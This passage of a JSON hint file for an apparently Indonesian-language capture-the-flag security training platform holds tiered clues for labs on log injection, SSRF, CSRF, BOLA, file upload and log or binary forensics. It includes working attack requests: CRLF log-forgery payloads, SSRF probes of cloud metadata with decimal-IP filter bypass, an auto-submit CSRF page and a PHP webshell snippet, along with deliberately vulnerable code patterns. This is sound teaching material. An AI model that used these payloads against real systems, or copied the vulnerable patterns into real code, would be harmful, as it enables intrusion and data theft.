        "guidance": "Di lab A09, buka tab Log Monitoring / SIEM Viewer. Lakukan percobaan login dengan nama pengguna unik seperti audit_user_probe. Perhatikan bagaimana entri dicatat. Uji apakah karakter newline (\\n / %0a) atau carriage return (\\r / %0d) diterima oleh endpoint login.",
        "investigativeQuestions": [
          "Apakah viewer log menampilkan teks setelah karakter newline pada baris baru terpisah?",
          "Apakah ada mekanisme encoding khusus untuk karakter kontrol ASCII sebelum ditulis ke file log?"
        ],
        "tacticalAction": "Kirim input yang mengandung karakter CRLF yang di-URL-encode ke endpoint login.",
        "codeBlueprint": "curl -i \"http://127.0.0.1:<PORT>/api/v1/auth/login\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\":\"auditor%0d%0a[CRITICAL]+Admin+session+authorized+from+127.0.0.1\",\"password\":\"test\"}'"
      },
      {
        "level": 2,
        "title": "Pemalsuan Jejak Forensik Siber (Log Forgery Mechanics)",
        "category": "Vulnerability Logic",
        "summary": "Pahami bagaimana ketidakmampuan parser membedakan pemisah baris asli dan buatan merusak validitas audit.",
        "guidance": "Format log standar berbasis teks mengandalkan baris baru (\\n) sebagai pembatas antar entri peristiwa. Jika aplikasi menulis input mentah klien tanpa memfilter %0d%0a, penyerang dapat menyuntikkan baris log palsu yang tampak seperti pesan sistem resmi, mengelabui SOC analis atau sistem SIEM.",
        "investigativeQuestions": [
          "Mengapa JSON structured logging jauh lebih tahan terhadap serangan CRLF dibandingkan format teks bebas?",
          "Bagaimana log forgery dapat digunakan untuk menutupi eksploitasi data lain yang sedang berlangsung?"
        ],
        "tacticalAction": "Periksa metode penulisan log yang tidak melakukan sanitasi karakter whitespace kontrol.",
        "codeBlueprint": "// Vulnerable Logging Pattern:\napp.post(\"/login\", (req, res) => {\n  const user = req.body.username;\n  fs.appendFileSync(\"/var/log/audit.log\", `[ATTEMPT] User: ${user} failed login.\\n`);\n  res.status(401).send(\"Invalid credentials\");\n});"
      },
      {
        "level": 3,
        "title": "Cetak Biru Injeksi Baris Log Audit Sintetis",
        "category": "Payload Blueprint",
        "summary": "Template request penyuntikan event keamanan palsu untuk membuktikan celah integritas telemetri.",
        "guidance": "Di Burp Suite Repeater, sisipkan payload CRLF terstruktur pada parameter username. Rancang baris log palsu yang mensimulasikan status sukses administratif. Buka panel Log Viewer untuk memverifikasi apakah baris sintetis tersebut berhasil masuk ke rekaman log.",
        "investigativeQuestions": [
          "Apakah baris log palsu muncul di viewer log dengan timestamp yang Anda atur?",
          "Apakah sistem verifikasi mencatat keberhasilan manipulasi log audit?"
        ],
        "tacticalAction": "Kirimkan payload log injection terstruktur melalui Burp Suite Repeater.",
        "codeBlueprint": "POST /api/v1/auth/audit-probe HTTP/1.1\nHost: 127.0.0.1:<PORT>\nContent-Type: application/json\n\n{\n  \"service_name\": \"auth_telemetry%0d%0a[SIEM_ALERT_CLEARED]+FlagProof:ZITERA_A09_LOG_VERIFIED\",\n  \"status\": \"failure\"\n}"
      }
    ]
  },
  "A10": {
    "labId": "A10",
    "labTitle": "A10: Server-Side Request Forgery (SSRF & Internal Cloud Metadata)",
    "tacticalRole": "Perimeter Boundary Traversal & Intranet Pivot Assessment",
    "missionOverview": "Mengeksploitasi celah Server-Side Request Forgery (SSRF): memaksa server web target membuat request HTTP keluar ke jaringan internal terlarang (127.0.0.1, internal services, atau cloud metadata service 169.254.169.254) untuk mengekstrak kredensial infrastruktur rahasia.",
    "keywords": [
      "ssrf",
      "server side request",
      "metadata",
      "169.254",
      "127.0.0.1",
      "localhost",
      "loopback",
      "cloud",
      "internal",
      "intranet",
      "webhook",
      "url",
      "pivot"
    ],
    "suggestedPrompts": [
      "Bagaimana cara menemukan parameter yang rentan terhadap SSRF?",
      "Mengapa server dapat mengakses alamat 127.0.0.1 dan 169.254.169.254 padahal kita dari internet luar tidak bisa?",
      "Teknik apa yang dapat digunakan untuk mem-bypass filter blacklist 127.0.0.1?",
      "Bagaimana cara merancang egress firewall atau allowlist aman terhadap SSRF?"
    ],
    "clues": [
      {
        "level": 1,
        "title": "Pemetaan Fitur Penarik URL Eksternal (URL Fetchers & Webhooks)",
        "category": "Observational",
        "summary": "Cari fitur yang menerima URL input: pengunduh avatar, konverter PDF, atau penguji webhook.",
        "guidance": "Di lab A10, cari form atau parameter seperti ?url=, ?webhook=, ?feed=, atau ?preview_endpoint=. Fitur ini biasanya mengunduh resource dari URL yang diberikan dan menampilkan responsnya kepada pengguna. Uji apakah server menerima URL dengan skema http:// atau file://.",
        "investigativeQuestions": [
          "Apakah server mengembalikan konten dari URL eksternal publik saat diuji?",
          "Bagaimana respons server jika diberi URL loopback http://localhost:80 atau http://127.0.0.1?"
        ],
        "tacticalAction": "Kirim request pengujian URL penarik gambar atau dokumen via curl.",
        "codeBlueprint": "curl -i -X POST \"http://127.0.0.1:<PORT>/api/v1/fetch/preview\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"target_url\":\"http://127.0.0.1:80/status\"}'"
      },
      {
        "level": 2,
        "title": "Pelanggaran Batas Perimeter Jaringan (Intranet Trust Pivot)",
        "category": "Vulnerability Logic",
        "summary": "Pahami mengapa layanan internal sering kali tidak memiliki proteksi password karena berasumsi aman di balik firewall.",
        "guidance": "Banyak arsitektur mikroservis atau server cloud berasumsi bahwa request yang tiba dari 127.0.0.1 atau subnet internal pasti terpercaya. Karena server web target berada di dalam jaringan privat tersebut, jika penyerang dapat mengendalikan ke mana server membuat request, penyerang dapat menyedot metadata cloud AWS/GCP (169.254.169.254) atau port manajemen internal.",
        "investigativeQuestions": [
          "Mengapa filter berbasis blacklist kata kunci '127.0.0.1' mudah diakali dengan representasi alternatif (desimal, octal, IPv6)?",
          "Informasi sensitif apa yang tersimpan pada link-local metadata address 169.254.169.254?"
        ],
        "tacticalAction": "Periksa pola pemanggilan library HTTP request backend tanpa validasi host.",
        "codeBlueprint": "// Vulnerable SSRF Handler:\napp.post(\"/api/preview\", async (req, res) => {\n  const target = req.body.url;\n  const response = await axios.get(target);\n  res.send(response.data);\n});"
      },
      {
        "level": 3,
        "title": "Cetak Biru Probe Metadata Cloud & Intranet Bypass",
        "category": "Payload Blueprint",
        "summary": "Template request SSRF untuk mengekstrak kredensial metadata atau endpoint layanan internal.",
        "guidance": "Di Burp Suite Repeater, ubah parameter target URL menjadi alamat endpoint metadata internal: http://169.254.169.254/latest/meta-data/ atau port administrasi internal http://127.0.0.1:8080/internal/keys. Telaah isi respons: apakah server mengembalikan konfigurasi rahasia atau token flag pembuktian exploit?",
        "investigativeQuestions": [
          "Apakah respon menyertakan token IAM atau konfigurasi enclave internal?",
          "Apakah flag ZITERA{...} tercetak di dalam body hasil fetch server?"
        ],
        "tacticalAction": "Kirimkan payload pengujian target URL internal melalui Burp Repeater.",
        "codeBlueprint": "POST /api/v1/telemetry/import-remote HTTP/1.1\nHost: 127.0.0.1:<PORT>\nContent-Type: application/json\n\n{\n  \"source_url\": \"http://127.0.0.1:80/internal/vault/flag.txt\"\n}"
      }
    ]
  },
  "D01": {
    "labId": "D01",
    "labTitle": "D01: Web Server Log Analysis & Threat Detection",
    "tacticalRole": "Forensic Triage & Pattern Anomaly Identification",
    "missionOverview": "Menganalisis log akses web server secara forensik untuk mengidentifikasi jejak aktivitas penyerang: pemindaian direktori otomatis, eksploitasi SQLi/XSS, dan anomali User-Agent.",
    "keywords": [
      "log analysis",
      "forensic",
      "threat detection",
      "blue team",
      "grep",
      "awk",
      "access.log",
      "status code",
      "user-agent",
      "siem",
      "anomaly"
    ],
    "suggestedPrompts": [
      "Perintah terminal apa yang paling efisien untuk menganalisis jutaan baris access.log?",
      "Bagaimana cara membedakan request pemindaian otomatis (scanner) dengan pengguna manusia?",
      "Bagaimana mendeteksi upaya SQL Injection atau Path Traversal dari URI request di log?",
      "Status code apa yang mengindikasikan eksploitasi berhasil vs eksploitasi yang gagal?"
    ],
    "clues": [
      {
        "level": 1,
        "title": "Penyaringan Log Berdasarkan Pola Status Code & Frekuensi",
        "category": "Observational",
        "summary": "Gunakan alat bantu Unix (grep, cut, sort, uniq) untuk mengelompokkan anomali request.",
        "guidance": "Buka file log target di lab D01 (/var/log/nginx/access.log). Lakukan agregasi: 1) IP mana yang mengirim request terbanyak dalam rentang waktu singkat? 2) URL apa saja yang menghasilkan status HTTP 404 berulang kali lalu tiba-tiba menghasilkan status 200 OK? Pola ini mencirikan brute-force direktori.",
        "investigativeQuestions": [
          "Berapa persentase status code 404 dibandingkan status 200 pada IP tersangka?",
          "Apakah ada User-Agent mencurigakan seperti 'sqlmap', 'nikto', atau string acak python-requests?"
        ],
        "tacticalAction": "Jalankan pipeline agregasi frekuensi IP di terminal lab.",
        "codeBlueprint": "awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -nr | head -n 10"
      },
      {
        "level": 2,
        "title": "Rekonstruksi Rantai Serangan (Kill Chain Timeline Analysis)",
        "category": "Vulnerability Logic",
        "summary": "Pahami alur investigasi kronologis dari fase pengintaian (recon) hingga fase eksfiltrasi data.",
        "guidance": "Penyerang meninggalkan jejak berurutan di log: pertama mereka memindai path umum (/admin, /login, /.env). Begitu menemukan endpoint rentan, frekuensi request melambat tetapi panjang URI membengkak karena membawa muatan payload. Temukan request terakhir yang menghasilkan HTTP 200 dengan ukuran respons yang melonjak drastis.",
        "investigativeQuestions": [
          "Pada jam dan detik berapa request dengan payload dieksekusi dengan sukses?",
          "Apakah ada parameter terinjeksi yang memuat perintah pembacaan file rahasia?"
        ],
        "tacticalAction": "Filter request yang menghasilkan status 200 dengan payload karakter khusus.",
        "codeBlueprint": "grep \" 200 \" /var/log/nginx/access.log | grep -E \"UNION|SELECT|etc/passwd\" | head -n 5"
      },
      {
        "level": 3,
        "title": "Cetak Biru Perintah Ekstraksi Bukti Forensik",
        "category": "Payload Blueprint",
        "summary": "Template query terminal untuk mengekstrak string bukti eksploitasi dari rekaman log server.",
        "guidance": "Jalankan ekspresi pencarian terfokus pada log yang telah difilter. Temukan rekaman request sukses yang membawa parameter flag verifikasi untuk menyelesaikan investigasi pertahanan ini.",
        "investigativeQuestions": [
          "Apakah output grep menampilkan token ZITERA{...} yang pernah diminta penyerang?",
          "Apakah Anda telah mencatat IP penyerang dan timestamp insiden?"
        ],
        "tacticalAction": "Ekstrak token bukti langsung dari file log menggunakan grep regex.",
        "codeBlueprint": "grep -oE \"ZITERA\\{[A-Za-z0-9_\\-]+\\}\" /var/log/nginx/access.log || echo \"Periksa log terotasi .1\""
      }
    ]
  },
  "D02": {
    "labId": "D02",
    "labTitle": "D02: Binary & Package Cryptographic Integrity",
    "tacticalRole": "Cryptographic Checksum & Binary Tampering Verification",
    "missionOverview": "Memverifikasi integritas kriptografis file executable dan paket perangkat lunak: menghitung hash SHA-256, mendeteksi modifikasi byte berbahaya (tampering), dan memvalidasi tanda tangan digital.",
    "keywords": [
      "binary",
      "integrity",
      "sha256",
      "checksum",
      "tampering",
      "signature",
      "gpg",
      "hash",
      "verification",
      "defense",
      "reverse engineering"
    ],
    "suggestedPrompts": [
      "Bagaimana cara memastikan binary yang diunduh tidak disusupi backdoor di tengah jalan?",
      "Mengapa perbandingan hash SHA-256 dianggap sebagai standar emas integritas file?",
      "Bagaimana penyerang memanipulasi checksum jika server distribusi tidak menggunakan HTTPS?",
      "Perintah apa yang digunakan untuk mengecek integritas paket secara otomatis di Linux?"
    ],
    "clues": [
      {
        "level": 1,
        "title": "Kalkulasi Checksum Kriptografis File Target",
        "category": "Observational",
        "summary": "Hitung hash SHA-256 dari binary target dan bandingkan dengan hash resmi yang dipublikasikan.",
        "guidance": "Di lab D02, Anda diberikan binary executable dan file manifest checksum resmi (checksums.sha256). Jalankan utilitas sha256sum pada binary target. Bandingkan setiap karakter output hash dengan string hash referensi di manifest.",
        "investigativeQuestions": [
          "Apakah ada ketidakcocokan karakter antara hasil kalkulasi lokal dengan daftar resmi?",
          "Berapa ukuran byte file target dibandingkan dengan ukuran yang tercatat di rilis resmi?"
        ],
        "tacticalAction": "Jalankan perintah verifikasi otomatis checksum di terminal lab.",
        "codeBlueprint": "sha256sum -c checksums.sha256"
      },
      {
        "level": 2,
        "title": "Mendeteksi Penyisipan Kode Berbahaya (Binary Modification Detection)",
        "category": "Vulnerability Logic",
        "summary": "Pahami bagaimana penyerang menyisipkan instruksi backdoor tanpa mengubah fungsi utama program.",
        "guidance": "Jika satu byte saja di dalam binary diubah oleh penyerang untuk menyuntikkan shellcode atau hook komunikasi C2, sifat Avalanche Effect pada algoritma SHA-256 akan menghasilkan nilai hash yang berubah total secara acak. Ketidakcocokan hash adalah bukti konklusif bahwa paket telah dikompromikan.",
        "investigativeQuestions": [
          "Mengapa algoritma hash lawas seperti MD5 dan SHA-1 sudah tidak layak untuk verifikasi integritas?",
          "Bagaimana mekanisme tanda tangan digital GPG melindungi checksum dari pemalsuan?"
        ],
        "tacticalAction": "Bandingkan perbedaan string atau simbol di dalam file yang dicurigai dimodifikasi.",
        "codeBlueprint": "strings zitera-agent-corrupt.bin | grep -iE \"http|flag|c2|payload\""
      },
      {
        "level": 3,
        "title": "Cetak Biru Verifikasi Integritas & Ekstraksi Token Bukti",
        "category": "Payload Blueprint",
        "summary": "Prosedur pemulihan binary yang sah dan ekstraksi token verifikasi pertahanan.",
        "guidance": "Gunakan binary sah yang lolos uji verifikasi SHA-256 untuk menjalankan perintah validasi diagnostik lab D02. Jalankan binary dengan argumen --verify-enclave untuk memunculkan token bukti keberhasilan proteksi integritas.",
        "investigativeQuestions": [
          "Apakah binary yang sah mengembalikan status INTEGRITY_VERIFIED?",
          "Apakah flag bukti dicetak pada output stdout?"
        ],
        "tacticalAction": "Jalankan binary terverifikasi dengan opsi audit integritas.",
        "codeBlueprint": "./zitera-agent-verified.bin --verify-integrity --manifest checksums.sha256"
      }
    ]
  },
  "W01": {
    "labId": "W01",
    "labTitle": "W01: Cross-Site Request Forgery (CSRF) & Token Defense",
    "tacticalRole": "Client-Side Ambient Credential Abuse Assessment",
    "missionOverview": "Mengeksploitasi dan memitigasi kerentanan Cross-Site Request Forgery (CSRF): memaksa browser korban yang telah login mengirimkan request pembaruan profil / transfer dana rahasia ke aplikasi target tanpa sepengetahuan korban.",
    "keywords": [
      "csrf",
      "xsrf",
      "cross-site request forgery",
      "token",
      "samesite",
      "cookie",
      "ambient credentials",
      "form",
      "poc",
      "anti-csrf",
      "referer"
    ],
    "suggestedPrompts": [
      "Bagaimana cara browser korban bisa mengirimkan request tanpa persetujuan pengguna?",
      "Apa yang membuat atribut SameSite=Lax atau SameSite=Strict kebal terhadap serangan CSRF?",
      "Bagaimana cara membuat HTML Exploit PoC form submit otomatis untuk CSRF?",
      "Mengapa request dengan Content-Type: application/json lebih tahan terhadap CSRF standar?"
    ],
    "clues": [
      {
        "level": 1,
        "title": "Inspeksi Ketiadaan Anti-CSRF Token & Atribut Cookie",
        "category": "Observational",
        "summary": "Amati request perubahan state sensitif (ganti email, ganti password, transfer uang).",
        "guidance": "Di lab W01, tangkap request saat melakukan aksi ubah email di Burp Suite: 1) Apakah body request atau URL memuat token acak anti-CSRF? 2) Periksa cookie sesi di tab Storage: apakah atribut SameSite disetel ke None atau kosong tanpa penegakan?",
        "investigativeQuestions": [
          "Apakah endpoint menerima request POST berformat application/x-www-form-urlencoded biasa?",
          "Apakah aksi perubahan data berhasil dieksekusi jika request dikirimkan tanpa token anti-CSRF?"
        ],
        "tacticalAction": "Kirim ulang request ubah email di Burp Repeater dengan menghapus parameter token jika ada.",
        "codeBlueprint": "POST /api/v1/user/email/update HTTP/1.1\nHost: 127.0.0.1:<PORT>\nContent-Type: application/x-www-form-urlencoded\nCookie: session_id=<VICTIM_COOKIE>\n\nemail=attacker%40zitera-auditor.io"
      },
      {
        "level": 2,
        "title": "Penyalahgunaan Kredensial Ambien Browser (Ambient Credentials)",
        "category": "Vulnerability Logic",
        "summary": "Pahami mengapa browser selalu otomatis menyertakan cookie sesi pada request lintas situs.",
        "guidance": "Ketika korban membuka tab baru ke situs berbahaya milik penyerang, situs tersebut dapat memuat tag HTML: <form action=\"http://target/api/update\" method=\"POST\">. Browser korban secara patuh menyertakan cookie sesi milik target karena browser menganggap request ditujukan ke domain target.",
        "investigativeQuestions": [
          "Bagaimana mekanisme Anti-CSRF token yang kriptografis dan terikat sesi membatalkan serangan ini?",
          "Mengapa header X-Requested-With atau header kustom memicu CORS Preflight dan memblokir CSRF?"
        ],
        "tacticalAction": "Buat file HTML PoC lokal untuk menguji apakah browser mengirimkan request otomatis.",
        "codeBlueprint": "<!-- Vulnerable Form Target Pattern -->\n<form id=\"csrfForm\" action=\"http://127.0.0.1:<PORT>/api/v1/user/email/update\" method=\"POST\">\n  <input type=\"hidden\" name=\"email\" value=\"pwned@zitera.io\" />\n</form>\n<script>document.getElementById(\"csrfForm\").submit();</script>"
      },
      {
        "level": 3,
        "title": "Cetak Biru PoC HTML Auto-Submit CSRF Exploit",
        "category": "Payload Blueprint",
        "summary": "Struktur halaman eksploitasi web yang mengeksekusi perubahan email korban secara otomatis.",
        "guidance": "Di panel pengujian eksploit lab W01, sajikan payload halaman HTML yang memuat form auto-submit ke endpoint perubahan data sensitif. Simulasikan kunjungan korban untuk melihat apakah email akun korban berhasil dialihkan ke alamat penyerang dan menghasilkan token pembuktian flag.",
        "investigativeQuestions": [
          "Apakah email akun korban berubah setelah PoC dijalankan?",
          "Apakah respon server menampilkan flag ZITERA{...} atas keberhasilan simulasi CSRF?"
        ],
        "tacticalAction": "Kirimkan payload PoC HTML terstruktur ke simulasi browser korban di lab.",
        "codeBlueprint": "<html>\n  <body>\n    <h2>Zitera Lab Security Audit - CSRF Simulation</h2>\n    <form id=\"exploit\" action=\"http://127.0.0.1:<PORT>/api/v1/account/update-email\" method=\"POST\">\n      <input type=\"hidden\" name=\"email\" value=\"attacker-auditor@zitera-lab.local\" />\n      <input type=\"hidden\" name=\"confirm\" value=\"true\" />\n    </form>\n    <script>document.getElementById(\"exploit\").submit();</script>\n  </body>\n</html>"
      }
    ]
  },
  "W02": {
    "labId": "W02",
    "labTitle": "W02: Server-Side Request Forgery (SSRF) & Metadata Service",
    "tacticalRole": "Advanced Egress Filtering & IP Whitelist Evasion Assessment",
    "missionOverview": "Mengeksploitasi SSRF tingkat lanjut dengan teknik bypass filter alamat IP internal (bypass blacklist 127.0.0.1 menggunakan notasi decimal, octal, DNS rebinding, atau redirect) untuk mengakses endpoint metadata rahasia.",
    "keywords": [
      "ssrf",
      "metadata",
      "bypass",
      "127.0.0.1",
      "decimal ip",
      "dns rebinding",
      "redirect",
      "filter evasion",
      "egress",
      "cloud metadata"
    ],
    "suggestedPrompts": [
      "Bagaimana cara mengubah alamat IP 127.0.0.1 ke bentuk bilangan bulat desimal (DWORD)?",
      "Bagaimana teknik HTTP 302 Redirect dapat mengelabui filter validasi SSRF di backend?",
      "Apa kelemahan fungsi URL parser yang berbeda antara filter validator dan library pengunduh?",
      "Bagaimana cara mendesain allowlist berbasis IP yang tahan dari trik manipulasi DNS?"
    ],
    "clues": [
      {
        "level": 1,
        "title": "Identifikasi Filter Blacklist Alamat IP",
        "category": "Observational",
        "summary": "Uji variasi representasi alamat localhost pada parameter URL pengunduh.",
        "guidance": "Di lab W02, jika Anda memasukkan http://127.0.0.1/ atau http://localhost/, server mengembalikan pesan error: 'Access to internal IP is blocked!'. Ini menandakan ada filter berbasis blacklist string sederhana. Uji representasi numerik alternatif seperti desimal: http://2130706433/ atau IPv6 loopback: http://[::1]/.",
        "investigativeQuestions": [
          "Representasi IP alternatif mana yang berhasil melewati pesan error validasi blacklist?",
          "Apakah server mengikuti redirect HTTP 301/302 jika diberi URL eksternal?"
        ],
        "tacticalAction": "Kirim request uji representasi IP desimal via curl.",
        "codeBlueprint": "curl -i -X POST \"http://127.0.0.1:<PORT>/api/v1/webhook/trigger\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"url\":\"http://2130706433:80/internal-status\"}'"
      },
      {
        "level": 2,
        "title": "Kegagalan Blacklist & Kerentanan Time-of-Check to Time-of-Use DNS",
        "category": "Vulnerability Logic",
        "summary": "Pahami mengapa pendekatan blacklist IP selalu gagal dan bagaimana DNS Rebinding bekerja.",
        "guidance": "Pendekatan blacklist gagal karena alamat IP memiliki puluhan representasi sintaks yang sah dalam standar RFC. Selain itu, jika validator memeriksa IP terlebih dahulu via dns.lookup(), penyerang dapat menggunakan domain DNS Rebinding yang merespons dengan IP publik pada pengecekan pertama, lalu merespons dengan IP 127.0.0.1 saat library fetch() kedua dieksekusi.",
        "investigativeQuestions": [
          "Mengapa pendekatan Allowlist domain dengan validasi IP hasil resolusi akhir adalah satu-satunya solusi aman?",
          "Bagaimana server internal memproses request dari loopback tanpa meminta kredensial tambahan?"
        ],
        "tacticalAction": "Periksa pola validasi URL backend yang mengandalkan regex blacklist naif.",
        "codeBlueprint": "// Vulnerable Blacklist Validation:\nfunction isSafe(url) {\n  if (url.includes(\"127.0.0.1\") || url.includes(\"localhost\")) return false;\n  return true;\n}"
      },
      {
        "level": 3,
        "title": "Cetak Biru SSRF Bypass IP Desimal / DNS Redirect",
        "category": "Payload Blueprint",
        "summary": "Struktur request SSRF terenkapsulasi untuk mengekstrak kunci rahasia dari service internal.",
        "guidance": "Di Burp Suite Repeater, gunakan nilai URL http://2130706433:80/secret-telemetry atau URL redirector pihak ketiga. Kirim request dan amati body respons: apakah data konfigurasi terproteksi berhasil ditarik oleh backend server dan dikembalikan kepada Anda beserta flag CTF?",
        "investigativeQuestions": [
          "Apakah respons status berubah dari 403 menjadi 200 OK?",
          "Apakah string token ZITERA{...} tercetak di body respons JSON?"
        ],
        "tacticalAction": "Kirimkan payload SSRF bypass menggunakan alamat IP desimal di Burp Repeater.",
        "codeBlueprint": "POST /api/v1/crawler/inspect HTTP/1.1\nHost: 127.0.0.1:<PORT>\nContent-Type: application/json\n\n{\n  \"target_endpoint\": \"http://2130706433:80/admin/internal-vault/token\"\n}"
      }
    ]
  },
  "W03": {
    "labId": "W03",
    "labTitle": "W03: Broken Object Level Authorization (API BOLA)",
    "tacticalRole": "RESTful API Access Control & Object Ownership Boundary Audit",
    "missionOverview": "Menganalisis kerentanan nomor 1 pada OWASP API Security Top 10: Broken Object Level Authorization (BOLA), di mana API endpoint mempercayai ID entitas objek yang dikirimkan oleh klien tanpa memverifikasi hak kepemilikan tenant.",
    "keywords": [
      "bola",
      "api",
      "idor",
      "rest",
      "authorization",
      "ownership",
      "tenant",
      "uuid",
      "record",
      "horizontal privilege"
    ],
    "suggestedPrompts": [
      "Apa perbedaan antara BOLA (Broken Object Level Authorization) dan BFLA (Function Level)?",
      "Mengapa penggunaan UUID saja tidak cukup untuk mencegah serangan BOLA?",
      "Bagaimana cara memetakan parameter ID objek tersembunyi pada endpoint REST API?",
      "Bagaimana menulis query database yang mengikat ID objek dengan ID pengguna secara atomik?"
    ],
    "clues": [
      {
        "level": 1,
        "title": "Inspeksi Struktur URL REST API & Parameter Entitas",
        "category": "Observational",
        "summary": "Petakan pola pemanggilan endpoint API yang menerima pengenal record di dalam path atau query string.",
        "guidance": "Di lab W03, amati komunikasi API di DevTools Network tab saat mengakses rekam medis atau transaksi: Perhatikan endpoint seperti /api/v2/patients/{patient_id}/records/{record_id}. Catat nilai ID akun Anda. Buka akun kedua jika tersedia, lalu bandingkan format identifier keduanya.",
        "investigativeQuestions": [
          "Apakah identifier berupa bilangan integer berurutan atau string UUID?",
          "Apakah server mengembalikan data saat nilai ID diubah ke nomor acak lain?"
        ],
        "tacticalAction": "Kirim request observasi melihat data diri sendiri ke Burp Suite Repeater.",
        "codeBlueprint": "GET /api/v2/records/1050 HTTP/1.1\nHost: 127.0.0.1:<PORT>\nAuthorization: Bearer <STUDENT_TOKEN>\nAccept: application/json"
      },
      {
        "level": 2,
        "title": "Ketiadaan Validasi Kepemilikan Objek di Lapisan Service (Missing Object Ownership Check)",
        "category": "Vulnerability Logic",
        "summary": "Pahami mengapa memverifikasi keabsahan token JWT tidak menjamin hak akses atas data objek yang diminta.",
        "guidance": "Aplikasi dengan benar memverifikasi bahwa token Anda valid dan tidak kedaluwarsa. Namun, controller API langsung memanggil RecordService.getById(req.params.id) tanpa menyertakan req.user.id ke dalam klausa pencarian. Akibatnya, siapapun yang memiliki token sah dapat membaca atau memodifikasi objek milik seluruh tenant.",
        "investigativeQuestions": [
          "Bagaimana cara menulis unit test untuk menguji otorisasi multi-tenant pada endpoint API?",
          "Apa bahayanya jika metode HTTP PUT atau DELETE juga rentan terhadap BOLA?"
        ],
        "tacticalAction": "Periksa implementasi query backend yang mengabaikan relasi kepemilikan pengguna di bawah.",
        "codeBlueprint": "// Vulnerable API Controller Pattern:\napp.get(\"/api/v2/records/:id\", authenticateUser, async (req, res) => {\n  const record = await Record.findOne({ where: { id: req.params.id } });\n  if (!record) return res.status(404).json({ error: \"Not found\" });\n  res.json(record);\n});"
      },
      {
        "level": 3,
        "title": "Cetak Biru Uji Ekstraksi Objek Antar-Tenant (API BOLA)",
        "category": "Payload Blueprint",
        "summary": "Template request manipulasi ID target untuk mengekstrak record administratif rahasia.",
        "guidance": "Di Burp Suite Repeater, pertahankan token Authorization milik akun Anda. Ubah ID record target dari ID Anda (misal 1050) menjadi ID target manajerial (misal 1001 atau 1000). Kirimkan request dan amati respons JSON: pastikan data privat milik pengguna lain terekspos bersama token bukti flag.",
        "investigativeQuestions": [
          "Apakah respons status mengembalikan 200 OK dengan detail rekam medis pasien lain?",
          "Apakah flag bukti audit ZITERA{...} tercetak di salah satu field respons?"
        ],
        "tacticalAction": "Kirim request dengan ID target termanipulasi melalui Burp Suite Repeater.",
        "codeBlueprint": "GET /api/v2/records/1000 HTTP/1.1\nHost: 127.0.0.1:<PORT>\nAuthorization: Bearer <YOUR_ACTIVE_TOKEN>\nUser-Agent: ZiteraAPIAuditor/2.0\nAccept: application/json"
      }
    ]
  },
  "W04": {
    "labId": "W04",
    "labTitle": "W04: Arbitrary File Upload & MIME Sniffing Bypass",
    "tacticalRole": "File Storage Architecture & Unrestricted Upload Assessment",
    "missionOverview": "Menganalisis celah pengunggahan file sembarang (Arbitrary File Upload): melewati validasi ekstensi frontend dan header MIME type buatan klien untuk mengunggah file script berbahaya (webshell) yang dieksekusi oleh web server target.",
    "keywords": [
      "upload",
      "file upload",
      "mime",
      "webshell",
      "extension",
      "bypass",
      "content-type",
      "magic bytes",
      "polyglot",
      "rce"
    ],
    "suggestedPrompts": [
      "Mengapa validasi ekstensi file di JavaScript browser tidak pernah dianggap aman?",
      "Bagaimana cara memanipulasi header Content-Type pada form upload multipart/form-data?",
      "Apa yang dimaksud dengan Magic Bytes pada verifikasi tipe file di backend?",
      "Langkah arsitektur apa yang membuat folder penyimpanan upload kebal dari eksekusi kode?"
    ],
    "clues": [
      {
        "level": 1,
        "title": "Observasi Form Upload & Format Request Multipart",
        "category": "Observational",
        "summary": "Tangkap paket upload gambar profil di Burp Suite dan amati atribut nama file serta Content-Type.",
        "guidance": "Di lab W04, coba unggah file gambar sah (.png atau .jpg). Tangkap request di Burp Proxy. Perhatikan bagian body request: Content-Disposition: form-data; name=\"avatar\"; filename=\"photo.png\" dan Content-Type: image/png. Amati URL path tempat file tersebut disimpan setelah upload berhasil (misal: /uploads/photo.png).",
        "investigativeQuestions": [
          "Apakah file yang diunggah dapat diakses langsung melalui URL publik di browser?",
          "Apakah server mengganti nama file secara acak atau mempertahankan nama file asli dari klien?"
        ],
        "tacticalAction": "Kirim request upload sah ke Burp Repeater untuk menguji manipulasi nama file.",
        "codeBlueprint": "POST /api/v1/user/avatar HTTP/1.1\nHost: 127.0.0.1:<PORT>\nContent-Type: multipart/form-data; boundary=---------------------------974767299852498929531610575\n\n-----------------------------974767299852498929531610575\nContent-Disposition: form-data; name=\"avatar\"; filename=\"test.png\"\nContent-Type: image/png\n\n[BINARY_PNG_BYTES]\n-----------------------------974767299852498929531610575--"
      },
      {
        "level": 2,
        "title": "Kegagalan Verifikasi Ekstensi & MIME Sniffing Trust",
        "category": "Vulnerability Logic",
        "summary": "Pahami mengapa mempercayai header Content-Type klien atau hanya memblokir ekstensi tertentu (.php) dapat di-bypass.",
        "guidance": "Banyak pengembang hanya memeriksa: if (req.headers[\"content-type\"] === \"image/png\") atau menggunakan blacklist ekstensi naif yang memblokir .php tetapi lupa memblokir .php5, .phtml, .php.png, atau .htaccess. Lebih parah lagi, direktori /uploads/ sering kali dikonfigurasi dengan izin eksekusi script oleh web server.",
        "investigativeQuestions": [
          "Mengapa penyimpanan file di bucket S3 atau storage tanpa hak eksekusi (noexec) sangat dianjurkan?",
          "Bagaimana fungsi pemeriksaan Magic Bytes membaca signature biner awal file?"
        ],
        "tacticalAction": "Ubah ekstensi file di Burp Repeater sambil mempertahankan header Content-Type image/png.",
        "codeBlueprint": "// Vulnerable Upload Handler Pattern:\nconst storage = multer.diskStorage({\n  destination: \"./public/uploads/\",\n  filename: (req, file, cb) => {\n    cb(null, file.originalname);\n  }\n});"
      },
      {
        "level": 3,
        "title": "Cetak Biru Upload Webshell Diagnostik & Eksekusi Perintah",
        "category": "Payload Blueprint",
        "summary": "Struktur request pengunggahan script pembuktian konsep untuk membaca file flag di server.",
        "guidance": "Di Burp Suite Repeater, ubah parameter filename menjadi exploit.php.png atau shell.php. Sisipkan kode pembuktian ringan: <?php echo \"ZITERA_PROBE: \" . file_get_contents(\"/opt/zitera/flag.txt\"); ?>. Kirim request, lalu akses path file tersebut via browser atau curl untuk melihat output eksekusi script.",
        "investigativeQuestions": [
          "Apakah server mengembalikan path lokasi file setelah upload sukses?",
          "Apakah membuka URL file mengeksekusi kode PHP dan memunculkan token flag?"
        ],
